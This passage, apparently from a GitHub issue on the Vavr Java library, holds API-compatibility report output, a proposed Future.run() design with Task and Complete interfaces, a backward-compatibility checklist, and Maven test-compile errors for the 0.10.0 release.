method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          + method iterate(java.util.function.Supplier)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      < interface io.vavr.collection.Traversable\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Traversable\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < interface io.vavr.collection.Tree\n[INFO]          + method build(java.lang.Iterable,java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Tree\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method recurse(java.lang.Object,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Tree$Node\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n[INFO] > io.vavr.concurrent                                 major      0.10.0     0.9.3      1.0.0      Version increase required\n[INFO]      > interface io.vavr.concurrent.Future\n[INFO]          + field DEFAULT_EXECUTOR\n[INFO]              + access final\n[INFO]              + access static\n[INFO]              + return java.util.concurrent.Executor\n[INFO]          + method await(long,java.util.concurrent.TimeUnit)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method executor()\n[INFO]              + return java.util.concurrent.Executor\n[INFO]          + method failed(java.util.concurrent.Executor,java.lang.Throwable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method failed(java.util.concurrent.ExecutorService,java.lang.Throwable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method find(java.util.concurrent.Executor,java.lang.Iterable,java.util.function.Predicate)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method find(java.util.concurrent.ExecutorService,java.lang.Iterable,java.util.function.Predicate)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method firstCompletedOf(java.util.concurrent.Executor,java.lang.Iterable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method firstCompletedOf(java.util.concurrent.ExecutorService,java.lang.Iterable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fold(java.util.concurrent.Executor,java.lang.Iterable,java.lang.Object,java.util.function.BiFunction)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fold(java.util.concurrent.ExecutorService,java.lang.Iterable,java.lang.Object,java.util.function.BiFunction)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fromCompletableFuture(java.util.concurrent.Executor,java.util.concurrent.CompletableFuture)\n[INFO]              + access static\n[INFO]              + annotated io.vavr.concurrent.GwtIncompatible\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fromCompletableFuture(java.util.concurrent.ExecutorService,java.util.concurrent.CompletableFuture)\n[INFO]              - access static\n[INFO]              - annotated io.vavr.concurrent.GwtIncompatible\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fromJavaFuture(java.util.concurrent.Executor,java.util.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fromJavaFuture(java.util.concurrent.ExecutorService,java.util.concurrent.Future)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method fromTry(java.util.concurrent.Executor,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method fromTry(java.util.concurrent.ExecutorService,io.vavr.control.Try)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method isCancelled()\n[INFO]              + access abstract\n[INFO]              + return boolean\n[INFO]          + method join(io.vavr.CheckedConsumer)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method join(java.util.concurrent.Executor,io.vavr.CheckedConsumer)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          + method of(java.util.concurrent.Executor,io.vavr.CheckedFunction0)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method of(java.util.concurrent.ExecutorService,io.vavr.CheckedFunction0)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method ofCallable(java.util.concurrent.Executor,java.util.concurrent.Callable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method ofCallable(java.util.concurrent.ExecutorService,java.util.concurrent.Callable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method ofSupplier(java.util.concurrent.Executor,java.util.function.Supplier)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method ofSupplier(java.util.concurrent.ExecutorService,java.util.function.Supplier)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method reduce(java.util.concurrent.Executor,java.lang.Iterable,java.util.function.BiFunction)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method reduce(java.util.concurrent.ExecutorService,java.lang.Iterable,java.util.function.BiFunction)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method run(java.util.concurrent.Executor,io.vavr.CheckedRunnable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method run(java.util.concurrent.ExecutorService,io.vavr.CheckedRunnable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method runRunnable(java.util.concurrent.Executor,java.lang.Runnable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method runRunnable(java.util.concurrent.ExecutorService,java.lang.Runnable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method sequence(java.util.concurrent.Executor,java.lang.Iterable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method sequence(java.util.concurrent.ExecutorService,java.lang.Iterable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method successful(java.util.concurrent.Executor,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method successful(java.util.concurrent.ExecutorService,java.lang.Object)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method traverse(java.util.concurrent.Executor,java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]          - method traverse(java.util.concurrent.ExecutorService,java.lang.Iterable,java.util.function.Function)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Future\n[INFO]      > interface io.vavr.concurrent.Promise\n[INFO]          + method executor()\n[INFO]              + return java.util.concurrent.Executor\n[INFO]          + method failed(java.util.concurrent.Executor,java.lang.Throwable)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method failed(java.util.concurrent.ExecutorService,java.lang.Throwable)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]          + method fromTry(java.util.concurrent.Executor,io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method fromTry(java.util.concurrent.ExecutorService,io.vavr.control.Try)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]          + method make(java.util.concurrent.Executor)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method make(java.util.concurrent.ExecutorService)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]          + method successful(java.util.concurrent.Executor,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.concurrent.Promise\n[INFO]          - method successful(java.util.concurrent.ExecutorService,java.lang.Object)\n[INFO]              - access static\n[INFO]              - return io.vavr.concurrent.Promise\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n[INFO] < io.vavr.control                                    minor      0.10.0     0.9.3      0.10.0     -         \n[INFO]      < interface io.vavr.control.Either\n[INFO]          + method filterOrElse(java.util.function.Predicate,java.util.function.Function)\n[INFO]              + return io.vavr.control.Either\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method toValidation()\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Either\n[INFO]          + method traverseRight(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Either\n[INFO]      < interface io.vavr.control.Option\n[INFO]          + method fold(java.util.function.Supplier,java.util.function.Function)\n[INFO]              + return java.lang.Object\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Option\n[INFO]      < interface io.vavr.control.Try\n[INFO]          + method fold(java.util.function.Function,java.util.function.Function)\n[INFO]              + return java.lang.Object\n[INFO]          + method onFailure(java.lang.Class,java.util.function.Consumer)\n[INFO]              + annotated io.vavr.control.GwtIncompatible\n[INFO]              + return io.vavr.control.Try\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method toValidation()\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method toValidation(java.util.function.Function)\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Try\n[INFO]      < interface io.vavr.control.Validation\n[INFO]          + method fromTry(io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Validation\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method traverse(java.lang.Iterable,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.control.Validation\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n```\n\n\nNote: the backw'incompat changes to (Priority)Queue.dropUntil(Predicate) look like false-positives to me.. We will introduce new functional interfaces for Future.run().\nBefore (cryptic):\njava\nstatic <T> Future<T> join(CheckedConsumer<Predicate<Try<? extends T>>> computation) { ... }\nAfter (human readable):\njava\nstatic <T> Future<T> run(Task<? extends T> task) { ... }\nwhere\n```java\n@FunctionalInterface\npublic interface Task {\n    void run(Complete<? extends T> complete) throws Throwable; // maybe Exception instead?\n}\n@FunctionalInterface\npublic interface Complete {\n    void with(Try<? extends T> value);\n}\n```\nUsage:\njava\nFuture.run(complete -> {\n    // do some heavy work here\n    if (getMood() == Mood.GOOD) {\n        complete.with(Try.success(\"\ud83d\ude0a\"));\n    } else {\n        complete.with(Try.failure(new BadMoodException());\n    }\n});\nNote: The new Future.run() API is good for many cases we needed Promise before. E.g. when having nested Futures:\njava\ninterface Future<T> {\n    Future<T> fallbackTo(Future<? extends T> that) {\n        return run(executor(), complete ->\n            onComplete(res -> {\n                if (res.isSuccess()) {\n                    complete.with(res);\n                } else {\n                    that.onComplete(alt -> complete.with(alt.isSuccess() ? alt : res));\n                }\n            })\n        );\n    }\n}\nThere is still one use-case for Promise we did not solve with the new Future.run() API: Passing the complete function to the outside of the run() method scope. See #2086. ### Current backward compatibility status (to be fixed)\nI ran the unit tests of v0.9.3 with the upcoming v0.10.0 classes. It boils down to:\n\n[x] the Traversableinterface needs a default impl for reject(Predicate) (see #2157). It is semantically equivalent to filter(predicate.negate())\n[x] we have to keep the public io.vavr.control.HashCodes and deprecate it (see #2275)\n[x] collections need to (re-)implement (Partial)Function* and withDefault(*) (see #2249, #2267)\n[x] CheckedFunctions should return Throwable instead of Exception for backw-compat reasons (see #2162)\n[x] The prev implies that CheckedFunction0 can't extends Callable => Revert #2305\n\nThe all should compile fine again.\nThese are the compile errors (work in progress):\n\n\n```\n[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project vavr: Compilation failure: Compilation failure: \n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractSeqTest.java:[228,31] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: interface io.vavr.collection.Seq\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractSeqTest.java:[1996,76] cannot find symbol\n[ERROR]   symbol:   method lift()\n[ERROR]   location: interface io.vavr.collection.Seq\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractSeqTest.java:[2004,69] cannot find symbol\n[ERROR]   symbol:   method withDefaultValue(java.lang.String)\n[ERROR]   location: interface io.vavr.collection.Seq\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractSeqTest.java:[2012,69] cannot find symbol\n[ERROR]   symbol:   method withDefault(Object::toString)\n[ERROR]   location: interface io.vavr.collection.Seq\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/IntMultimap.java:[34,14] io.vavr.collection.IntMultimap is not abstract and does not override abstract method reject(java.util.function.Predicate super T) in io.vavr.collection.Traversable\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractMapTest.java:[508,40] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: interface io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractMapTest.java:[513,29] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: interface io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractMapTest.java:[1213,65] cannot find symbol\n[ERROR]   symbol:   method withDefaultValue(int)\n[ERROR]   location: interface io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractMapTest.java:[1220,65] cannot find symbol\n[ERROR]   symbol:   method withDefault(String::length)\n[ERROR]   location: interface io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/IntMap.java:[34,14] io.vavr.collection.IntMap is not abstract and does not override abstract method reject(java.util.function.Predicate super T) in io.vavr.collection.Traversable\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/QuickSortTest.java:[46,106] cannot find symbol\n[ERROR]   symbol:   method withDefaultValue(io.vavr.collection.List)\n[ERROR]   location: interface io.vavr.collection.Map>\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractMultimapTest.java:[385,43] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: interface io.vavr.collection.Multimap\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/AbstractMultimapTest.java:[390,32] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: interface io.vavr.collection.Multimap\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/TupleTest.java:[111,44] cannot find symbol\n[ERROR]   symbol:   variable HashCodes\n[ERROR]   location: class io.vavr.TupleTest\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src/test/java/io/vavr/collection/CharSeqTest.java:[2126,45] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: class io.vavr.collection.CharSeq\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[600,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[606,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[607,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[613,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[614,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[615,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[621,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[622,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[623,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[624,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[630,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[631,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[632,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[633,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[634,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[640,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[641,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[642,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[643,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[644,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[645,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[651,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[652,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[653,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[654,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[655,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[656,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[657,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[663,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[664,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[665,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[666,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[667,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[668,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[669,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[670,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[676,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[677,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[678,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[679,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[680,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[681,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[682,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[683,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] /Users/daniel/git/vavr-io/vavr-0.10.0/vavr/src-gen/test/java/io/vavr/APITest.java:[684,21] cannot find symbol\n[ERROR]   symbol:   method apply(int)\n[ERROR]   location: variable map of type io.vavr.collection.Map\n[ERROR] 